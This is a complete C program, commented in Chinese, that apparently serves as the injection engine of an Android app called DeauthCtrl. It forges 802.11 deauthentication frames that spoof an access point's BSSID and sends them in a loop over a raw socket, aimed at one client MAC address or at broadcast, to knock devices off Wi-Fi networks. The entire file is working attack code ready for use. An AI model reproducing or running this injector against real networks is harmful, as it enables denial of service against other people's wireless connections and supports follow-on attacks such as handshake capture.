/*
 * deauth-frame —— 原生 802.11 去认证帧注入器(纯 C,无第三方依赖)
 *
 * DeauthCtrl 内置注入引擎。通过 AF_PACKET raw socket 构造并注入
 * 802.11 管理帧(Deauth, type=0xC0):
 *
 *   deauth-frame <iface> <bssid> <client_mac|broadcast> <count> <interval_ms>
 *
 * 前提(Android 平台硬限制,缺一不可):
 *   - root(su 执行,否则 AF_PACKET 被 SELinux 拒绝)
 *   - 接口已进入监控模式(Nexmon 固件 / nexutil / iw 完成)
 *   - 芯片固件支持帧注入
 *
 * 帧结构: Radiotap 头(12B) + 802.11 管理帧头(24B) + Deauth 固定字段(2B)。
 * 每注入一帧向 stdout 输出 "DeAuth <seq>" 供上层引擎计数。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <time.h>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>

#define FRAME_LEN 38 /* 12 radiotap + 24 mgmt + 2 reason */
#define REASON_CODE 7 /* Class 3 frame received from nonassociated STA */

static volatile int g_stop = 0;

static void on_sigint(int sig) { (void)sig; g_stop = 1; }

static int parse_mac(const char *s, unsigned char out[6]) {
    unsigned int m[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) != 6) return -1;
    for (int i = 0; i < 6; i++) {
        if (m[i] > 0xFF) return -1;
        out[i] = (unsigned char)m[i];
    }
    return 0;
}

static void nsleep_ms(long ms) {
    struct timespec ts;
    ts.tv_sec = ms / 1000;
    ts.tv_nsec = (ms % 1000) * 1000000L;
    nanosleep(&ts, NULL);
}

int main(int argc, char **argv) {
    if (argc < 5) {
        fprintf(stderr, "usage: %s <iface> <bssid> <client_mac|broadcast> <count> [interval_ms]\n", argv[0]);
        fprintf(stderr, "  count=0 持续注入直到 SIGINT;interval_ms 默认 100\n");
        return 2;
    }
    const char *iface = argv[1];
    unsigned char bssid[6], client[6];
    if (parse_mac(argv[2], bssid) != 0) { fprintf(stderr, "bad bssid\n"); return 2; }
    int is_broadcast = strcmp(argv[3], "broadcast") == 0;
    if (!is_broadcast && parse_mac(argv[3], client) != 0) { fprintf(stderr, "bad client mac\n"); return 2; }
    long count = atol(argv[4]);
    long interval_ms = argc > 5 ? atol(argv[5]) : 100;
    if (interval_ms <= 0) interval_ms = 100;

    signal(SIGINT, on_sigint);
    signal(SIGTERM, on_sigint);

    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        fprintf(stderr, "socket(AF_PACKET) failed: %s —— 需要 root 且接口处于监控模式\n", strerror(errno));
        return 1;
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        fprintf(stderr, "ioctl(SIOCGIFINDEX) failed for %s: %s\n", iface, strerror(errno));
        close(sock);
        return 1;
    }

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_ifindex = ifr.ifr_ifindex;
    sa.sll_protocol = htons(ETH_P_ALL);

    /* Radiotap 头:版本 0,长度 12,Flags=0(无 FCS) */
    unsigned char frame[FRAME_LEN];
    memset(frame, 0, sizeof(frame));
    frame[0] = 0x00;                 /* radiotap version */
    frame[1] = 0x00;                 /* pad */
    frame[2] = 12; frame[3] = 0;     /* radiotap length (LE) */
    frame[4] = 0x00; frame[5] = 0x00; frame[6] = 0x00; frame[7] = 0x00; /* present flags */

    /* 802.11 管理帧头:FC = 0xC0(Deauth), 持续 0, addr1=client/bcast, addr2=bssid, addr3=bssid */
    unsigned char *h = frame + 12;
    h[0] = 0xC0; h[1] = 0x00;        /* frame control */
    h[2] = 0x00; h[3] = 0x00;        /* duration */
    if (is_broadcast) {
        memset(h + 4, 0xFF, 6);      /* addr1 = broadcast */
    } else {
        memcpy(h + 4, client, 6);    /* addr1 = 目标客户端 */
    }
    memcpy(h + 10, bssid, 6);        /* addr2 = BSSID(AP) */
    memcpy(h + 16, bssid, 6);        /* addr3 = BSSID */
    h[22] = 0x00; h[23] = 0x00;      /* seq ctl */

    /* Deauth 固定字段:reason code 7 */
    frame[36] = REASON_CODE & 0xFF;
    frame[37] = (REASON_CODE >> 8) & 0xFF;

    long sent = 0;
    unsigned short seq = 0;
    fprintf(stderr, "deauth-frame: iface=%s bssid=%s target=%s count=%ld interval=%ldms\n",
            iface, argv[2], is_broadcast ? "broadcast" : argv[3], count, interval_ms);

    while (!g_stop) {
        if (count > 0 && sent >= count) break;
        h[22] = (unsigned char)(seq & 0xFF);      /* 序号低字节 */
        h[23] = (unsigned char)((seq >> 8) & 0x0F); /* 片段号 + 序号高 4 位 */

        ssize_t n = sendto(sock, frame, sizeof(frame), 0, (struct sockaddr *)&sa, sizeof(sa));
        if (n < 0) {
            fprintf(stderr, "sendto failed: %s\n", strerror(errno));
            break;
        }
        sent++;
        seq++;
        printf("DeAuth %ld\n", sent); /* 引擎按此模式计数 */
        fflush(stdout);
        if (count > 0 && sent >= count) break;
        nsleep_ms(interval_ms);
    }

    fprintf(stderr, "deauth-frame: sent %ld frames, exiting\n", sent);
    close(sock);
    return 0;
}
